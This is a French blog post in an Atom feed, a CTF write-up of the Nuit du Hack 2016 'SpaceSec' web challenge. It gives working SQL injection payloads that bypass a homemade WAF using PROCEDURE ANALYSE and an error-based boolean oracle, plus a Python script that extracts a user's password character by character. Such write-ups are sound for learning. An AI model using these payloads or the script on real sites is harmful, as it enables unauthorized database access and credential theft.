<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom"><title>Daily Security - NDH</title><link href="https://www.dailysecurity.fr/" rel="alternate"></link><link href="https://www.dailysecurity.fr/tag/ndh/feed/index.xhtml" rel="self"></link><id>https://www.dailysecurity.fr/</id><updated>2016-04-04T09:08:00+02:00</updated><entry><title>Nuit du Hack Quals 2016 – SpaceSec – Write-Up</title><link href="https://www.dailysecurity.fr/write-up-ndh-quals-2016-spacesec" rel="alternate"></link><published>2016-04-04T09:08:00+02:00</published><updated>2016-04-04T09:08:00+02:00</updated><author><name>Geluchat</name></author><id>tag:www.dailysecurity.fr,2016-04-04:/write-up-ndh-quals-2016-spacesec</id><summary type="html">&lt;p&gt;Le week-end dernier, j'ai participé aux qualifications de la Nuit du Hack 2016 avec l'équipe khack40. Les 10 premières équipes recevaient des places gratuites pour la Nuit du Hack (début juillet) ainsi que la possibilité de participer au CTF privé lors de l’événement , et comme l'année dernière nous n'avons …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Le week-end dernier, j'ai participé aux qualifications de la Nuit du Hack 2016 avec l'équipe khack40. Les 10 premières équipes recevaient des places gratuites pour la Nuit du Hack (début juillet) ainsi que la possibilité de participer au CTF privé lors de l’événement , et comme l'année dernière nous n'avons malheureusement pas réussi à nous qualifier.&lt;/p&gt;
&lt;p&gt;Nous avons tout de même atteint la 11ème place (la place ingrate) ce qui est mieux que l'année précédente où après un rush infernal des autres équipes pendant la nuit nous avions finalement fini 28ème.&lt;/p&gt;
&lt;p&gt;Comme chaque année le guessing était présent (la stéganographie principalement) mais cela ne m'a pas empêché de trouver des épreuves intéressantes comme l'épreuve de web que je vais vous présenter.&lt;/p&gt;
&lt;h3&gt;SpaceSec 300 pts&lt;/h3&gt;
&lt;p&gt;&lt;img src="https://www.dailysecurity.fr/images/SpaceSec.png" alt="SpaceSec Challenge" style="width: 70%;"&gt;&lt;/p&gt;
&lt;p&gt;La page est basique, un bon vieux challenge fait avec Bootstrap.&lt;/p&gt;
&lt;p&gt;On remarque que tous les articles proposés contiennent les mêmes descriptions, seuls les numéros de CVE et les auteurs semblent changer.&lt;/p&gt;
&lt;p&gt;En cliquant sur Older Post on obtient une adresse du type:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;http://spacesec.quals.nuitduhack.com/index.php?offset=6&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Si on change un peu l'offset on obtient :&lt;/p&gt;
&lt;p&gt;&lt;img src="https://www.dailysecurity.fr/images/SpaceSec-User-Flag.png" alt="SpaceSec Challenge User Flag" style="width: 60%;"&gt;&lt;/p&gt;
&lt;p&gt;Oh un utilisateur qui s'appelle Flag...&lt;/p&gt;
&lt;p&gt;Soyons fou, tentons la SQL injection directement :&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;http://spacesec.quals.nuitduhack.com/index.php?offset=6'&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src="https://www.dailysecurity.fr/images/SpaceSec_Waf.png" alt="SpaceSec Waf" style="width: 60%;"&gt;&lt;/p&gt;
&lt;p&gt;Bon, ça ne marche pas très bien, voyons voir si l'on peut au moins déclencher une erreur SQL:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;http://spacesec.quals.nuitduhack.com/index.php?offset=-1&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src="https://www.dailysecurity.fr/images/SpaceSec_-1.png" alt="SpaceSec SQLi" style="width: 60%;"&gt;&lt;/p&gt;
&lt;p&gt;Yeah, une belle erreur SQL !&lt;/p&gt;
&lt;p&gt;En résumé, nous avons :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Un utilisateur Flag&lt;/li&gt;
&lt;li&gt;Un offset modifiable d'une requête SQL&lt;/li&gt;
&lt;li&gt;Une erreur SQL&lt;/li&gt;
&lt;li&gt;Un affichage du numéro de l'erreur SQL&lt;/li&gt;
&lt;li&gt;Un WAF maison (un pare-feu pour le Web)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Après un petit temps de réflexion on en vient à deux remarques :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Le WAF se bypass facilement à coups de %0a pour les espaces et de changements de casse (SeLEcT par exemple)&lt;/li&gt;
&lt;li&gt;On ne peut pas faire d'UNION, la requête contient donc probablement un order by.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;La requête est donc dans le genre:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nx"&gt;SELECT&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="nx"&gt;FROM&lt;/span&gt; &lt;span class="nx"&gt;latable&lt;/span&gt; &lt;span class="nx"&gt;ORDER&lt;/span&gt; &lt;span class="nx"&gt;BY&lt;/span&gt; &lt;span class="nb"&gt;rand&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="nx"&gt;LIMIT&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt; &lt;span class="nx"&gt;OFFSET&lt;/span&gt; &lt;span class="nv"&gt;$_GET&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;offset&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Quelques recherches sur le web nous permettent de trouver un bypass assez sympathique à coup de procédure SQL.&lt;/p&gt;
&lt;p&gt;&lt;a href="http://raijee1337.blogspot.fr/2015/07/bypassing-incorrect-usage-of-union-and-order-by.html"&gt;L'article&lt;/a&gt; en question nous parle de l'utilisation de la procédure ANALYSE qui est présente dans mysql de base.&lt;/p&gt;
&lt;p&gt;C'est presque trop beau pour être vrai, et... en effet ça l'est !&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;http://spacesec.quals.nuitduhack.com/index.php?offset=1%a0PRoCEDuRE%a0aNaLYSE%0a(eXtractValue%0a(0,1),1)--&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src="https://www.dailysecurity.fr/images/SpaceSec_Error1108-1.png" alt="Error1108" style="width: 60%;"&gt;&lt;/p&gt;
&lt;p&gt;La page ne nous ressort que le numéro de l'erreur...&lt;/p&gt;
&lt;p&gt;Alors, que faire pour contourner ce problème?&lt;/p&gt;
&lt;p&gt;Eh bien, la réponse est simple, il suffit juste de faire une time-based injection !&lt;/p&gt;
&lt;p&gt;Et... ça ne fonctionne pas, l'auteur du challenge à décidé de bloquer les fonctions sleep et benchmark...&lt;/p&gt;
&lt;p&gt;Qu'à cela ne tienne, on passe donc par des heavy query !&lt;/p&gt;
&lt;p&gt;On récupère plein de fois information_schema pour faire ramer la page et... information_schema est bloqué aussi ?!&lt;/p&gt;
&lt;p&gt;&lt;img src="https://www.dailysecurity.fr/images/imdone.gif" alt="Im done" style="width: 50%;"/&gt; &lt;/p&gt;
&lt;p&gt;Je décide donc d'aller me coucher sur un échec. Ce fut à la fois une bonne et une mauvaise idée :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;J'ai trouvé la réponse dans la nuit&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Je n'ai pas dormi avant de l'avoir trouvée&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;De retour le lendemain &lt;s&gt;matin&lt;/s&gt; après-midi, je décide de tenter ma trouvaille :&lt;/p&gt;
&lt;p&gt;Une SQL injection Boolean Based Into Double Error Based (oui, j'ai inventé le nom, mais ça en jette non?).&lt;/p&gt;
&lt;p&gt;J'explique, on va tenter de faire passer une condition dans notre extractvalue, si cette condition est vraie on lui fait faire un convert(9990130101,date), la date étant complétement fausse la fonction plante et retourne NULL, sinon, on retourne 1.&lt;/p&gt;
&lt;p&gt;Ce qu'il faut savoir, c'est que la procédure ANALYSE n'aime pas avoir un paramètre à NULL, elle crash donc un message d'&lt;a href="http://dev.mysql.com/doc/refman/5.0/en/error-messages-server.html#error_er_wrong_parameters_to_procedure"&gt;erreur 1108&lt;/a&gt; qui signifie "Message: Incorrect parameters to procedure '%s'"&lt;/p&gt;
&lt;p&gt;En revanche si on lui envoie 1 en premier paramètre elle nous renvoie juste une erreur &lt;a href="http://dev.mysql.com/doc/refman/5.0/en/error-messages-server.html#error_er_unknown_error"&gt;1105&lt;/a&gt; : "Message: Unknown error"&lt;/p&gt;
&lt;p&gt;On peut tester avec:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;http://spacesec.quals.nuitduhack.com/index.php?offset=1 PRoCEDuRE aNaLYSE ( (selEct exTractvalue (rAnd (),coNcat (0x3a, (case when (substring(1,1,1)=1) then convert(9990130101,date) else 1 end)))),1)--&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;J'ai remplacé les %0a par des espaces pour un souci de compréhension.&lt;/p&gt;
&lt;p&gt;&lt;img src="https://www.dailysecurity.fr/images/SpaceSec_Error1108-1.png" alt="Error1108" style="width: 60%;"&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;http://spacesec.quals.nuitduhack.com/index.php?offset=1 PRoCEDuRE aNaLYSE ( (selEct exTractvalue (rAnd (),coNcat (0x3a, (case when (substring(1,1,1)!=1) then convert(9990130101,date) else 1 end)))),1)--&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src="https://www.dailysecurity.fr/images/SpaceSec_Error1105.png" alt="Error1105" style="width: 60%;"&gt;&lt;/p&gt;
&lt;p&gt;A partir de là on peut tout simplement récupérer le mot de passe de l'utilisateur Flag dans la base de données.&lt;/p&gt;
&lt;p&gt;Je vous épargne le temps afin de trouver la bonne table avec les bonnes colonnes (totalement au hasard).&lt;/p&gt;
&lt;p&gt;Au final, on trouve une table users avec les colonnes id, username et password.&lt;/p&gt;
&lt;p&gt;Ni une, ni deux, on code un petit script qui récupère tout ça.&lt;/p&gt;
&lt;p&gt;Ayant une petite dent contre la programmation, je vous présente mon modeste script qui n'est pas optimisé mais qui fait le taf' :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="ch"&gt;#!/usr/bin/env python2&lt;/span&gt;
&lt;span class="c1"&gt;# -*- coding: utf8 -*-&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nn"&gt;time&lt;/span&gt;

&lt;span class="n"&gt;cookie&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;PHPSESSID&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;cl4r4m0rg4ne1sg00dbUt1pr3f3r3L3xiB3ll3&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="n"&gt;passwd&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;
&lt;span class="n"&gt;char&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;48&lt;/span&gt;

&lt;span class="n"&gt;length&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;passwd&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;

&lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="n"&gt;char&lt;/span&gt;&lt;span class="o"&gt;!=&lt;/span&gt;&lt;span class="mi"&gt;127&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;forge&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;http://spacesec.quals.nuitduhack.com/index.php?offset=1&lt;/span&gt;&lt;span class="si"&gt;%a&lt;/span&gt;&lt;span class="s2"&gt;0PRoCEDuRE&lt;/span&gt;&lt;span class="si"&gt;%a&lt;/span&gt;&lt;span class="s2"&gt;0aNaLYSE&lt;/span&gt;&lt;span class="si"&gt;%0a&lt;/span&gt;&lt;span class="s2"&gt;(&lt;/span&gt;&lt;span class="si"&gt;%0a&lt;/span&gt;&lt;span class="s2"&gt;(selEct&lt;/span&gt;&lt;span class="si"&gt;%0a&lt;/span&gt;&lt;span class="s2"&gt;exTractvalue&lt;/span&gt;&lt;span class="si"&gt;%0a&lt;/span&gt;&lt;span class="s2"&gt;(rAnd&lt;/span&gt;&lt;span class="si"&gt;%0a&lt;/span&gt;&lt;span class="s2"&gt;(),coNcat&lt;/span&gt;&lt;span class="si"&gt;%0a&lt;/span&gt;&lt;span class="s2"&gt;(0x3a,&lt;/span&gt;&lt;span class="si"&gt;%0a&lt;/span&gt;&lt;span class="s2"&gt;(case&lt;/span&gt;&lt;span class="si"&gt;%0a&lt;/span&gt;&lt;span class="s2"&gt;when&lt;/span&gt;&lt;span class="si"&gt;%0a&lt;/span&gt;&lt;span class="s2"&gt;(substring(&lt;/span&gt;&lt;span class="si"&gt;%0a&lt;/span&gt;&lt;span class="s2"&gt;(selEct&lt;/span&gt;&lt;span class="si"&gt;%0a&lt;/span&gt;&lt;span class="s2"&gt;password&lt;/span&gt;&lt;span class="si"&gt;%0a&lt;/span&gt;&lt;span class="s2"&gt;fRom&lt;/span&gt;&lt;span class="si"&gt;%0a&lt;/span&gt;&lt;span class="s2"&gt;users&lt;/span&gt;&lt;span class="si"&gt;%0a&lt;/span&gt;&lt;span class="s2"&gt;wHere&lt;/span&gt;&lt;span class="si"&gt;%0a&lt;/span&gt;&lt;span class="s2"&gt;username&lt;/span&gt;&lt;span class="si"&gt;%0a&lt;/span&gt;&lt;span class="s2"&gt;liKe&lt;/span&gt;&lt;span class="si"&gt;%0a&lt;/span&gt;&lt;span class="s2"&gt;0x464c4147),&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;length&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;,1)=char(&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;char&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;))&lt;/span&gt;&lt;span class="si"&gt;%0a&lt;/span&gt;&lt;span class="s2"&gt;then&lt;/span&gt;&lt;span class="si"&gt;%0a&lt;/span&gt;&lt;span class="s2"&gt;convert(9990130101,date)&lt;/span&gt;&lt;span class="si"&gt;%0a&lt;/span&gt;&lt;span class="s2"&gt;else&lt;/span&gt;&lt;span class="si"&gt;%0a&lt;/span&gt;&lt;span class="s2"&gt;1&lt;/span&gt;&lt;span class="si"&gt;%0a&lt;/span&gt;&lt;span class="s2"&gt;end)))),1)--&amp;quot;&lt;/span&gt;
    &lt;span class="n"&gt;resultat&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;forge&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;cookies&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;cookie&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;content&lt;/span&gt;
    &lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="n"&gt;forge&lt;/span&gt;
    &lt;span class="n"&gt;time&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sleep&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mf"&gt;0.5&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;resultat&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;find&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1108&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;!=-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;passwd&lt;/span&gt;&lt;span class="o"&gt;+=&lt;/span&gt;&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;chr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;char&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
        &lt;span class="n"&gt;char&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;47&lt;/span&gt;
        &lt;span class="n"&gt;length&lt;/span&gt;&lt;span class="o"&gt;+=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;
        &lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="n"&gt;passwd&lt;/span&gt;
    &lt;span class="n"&gt;char&lt;/span&gt;&lt;span class="o"&gt;+=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;

&lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;[+] Le password est: &amp;quot;&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;passwd&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;On obtient un mot de passe qui ressemble à un hash de 128 caractères en majuscule.&lt;/p&gt;
&lt;p&gt;La partie rigolote de l'histoire est que j'ai cherché pendant une bonne demi-heure quoi en faire et au final Mastho, un membre de mon équipe, l'a valider en 5 secondes en m'expliquant qu'il avait juste mis le hash en minuscule...&lt;/p&gt;
&lt;p&gt;En définitive, une épreuve bien marrante avec des protections assez funs.&lt;/p&gt;
&lt;p&gt;Voilà, c’est déjà terminé, n’hésitez pas à rejoindre mon Twitter pour avoir des news sur le site et mon point de vue sur l’actualité de la sécurité informatique.&lt;/p&gt;
&lt;p&gt;Geluchat.&lt;/p&gt;</content><category term="L'actualité commentée"></category><category term="WriteUp"></category><category term="NDH"></category><category term="CTF"></category><category term="SQL"></category></entry></feed>